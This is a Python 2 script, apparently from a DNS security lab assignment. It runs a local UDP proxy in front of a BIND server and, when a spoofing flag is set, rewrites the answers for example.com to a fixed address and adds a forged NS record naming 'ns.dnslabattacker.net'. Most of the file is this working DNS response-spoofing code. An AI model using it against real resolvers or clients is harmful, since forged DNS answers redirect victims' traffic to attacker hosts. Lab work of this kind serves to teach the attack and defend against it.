import argparse
import socket
from scapy.all import *
"""
REFERENCES: TCP PROXY SERVER IN PYTHON https://github.com/tigerlyb/DNS-Proxy-Server-in-Python/blob/master/DNSProxyServer.py
"""

parser = argparse.ArgumentParser()
parser.add_argument("--port", help="port to run your proxy on - careful to not run it on the same port as the BIND server", type=int)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int)
parser.add_argument("--spoof_response", action="store_true", help="flag to indicate whether you want to spoof the BIND Server's response (Part 3) or return it as is (Part 2). Set to True for Part 3 and False for Part 2", default=False)
args = parser.parse_args()
# Port to run the proxy on
port = args.port
# BIND's port
dns_port = args.dns_port
# Flag to indicate if the proxy should spoof responses
SPOOF = args.spoof_response
# IP of localhost
localhost = "127.0.0.1"
to_be_spoofed = {'example.com.': {
	'ipv4': '1.2.3.4',
	'ns': 'ns.dnslabattacker.net.'
}}

def send_to_server(dns_ip, query):
    server = (dns_ip, dns_port)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(server)
    tcp_query = "\x00"+ chr(len(query)) + query
    sock.send(tcp_query)  	
    data = sock.recv(1024)
    return data

def handler(data, addr, socket, dns_ip):
    print "Received request from client"
    server_response = send_to_server(dns_ip, data)
    print "Received response from DNS server"
    if server_response:
        rcode = server_response[:6].encode("hex")
        rcode = str(rcode)[11:]
        if (int(rcode, 16) == 1):
            print "Format Error: Request is not a DNS query"
        else:
            original_dns_packet = IP(server_response[2:])/UDP(server_response[2:])/DNS(server_response[2:])
            url = original_dns_packet[DNS].qd.qname
            if url in to_be_spoofed:
                print "Request for %s will be spoofed" % url[:-1]
                print "Original\n", original_dns_packet.show()
                original_dns_packet[DNS].an = DNSRR(rrname=url, rdata=to_be_spoofed[url]['ipv4'])
                original_dns_packet[DNS].ancount = 1
                original_dns_packet[DNS].ar = NotImplemented
                original_dns_packet[DNS].arcount = 0
                original_dns_packet[DNS].ns = DNSRR(rrname=original_dns_packet[DNS].qd.qname, type='NS', ttl=84107, rdata=to_be_spoofed[url]['ns'])
                original_dns_packet[DNS].nscount = 1
                del original_dns_packet[IP].len
                del original_dns_packet[IP].chksum
                del original_dns_packet[UDP].len
                del original_dns_packet[UDP].chksum
                print "Spoofed packet", original_dns_packet.summary()
                proxy_response = str(original_dns_packet)
            else:
                print "Request for %s will NOT be spoofed" % url[:-1]
                proxy_response = server_response[2:]
            print "Sending DNS response to client"
            print type(proxy_response), len(proxy_response)
            socket.sendto(proxy_response, addr)
            print "Success!"
    else:
        print "Format Error: Request is not a DNS query"

if __name__ == '__main__':
    dns_ip = localhost
    port = port
    host = localhost
    try:
        # setup UDP proxy server to get DNS request from client, send to DNS server
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind((host, port))
        while True:
            data, addr = sock.recvfrom(1024)
            handler(data, addr, sock, dns_ip)
    except Exception, e:
        print e
		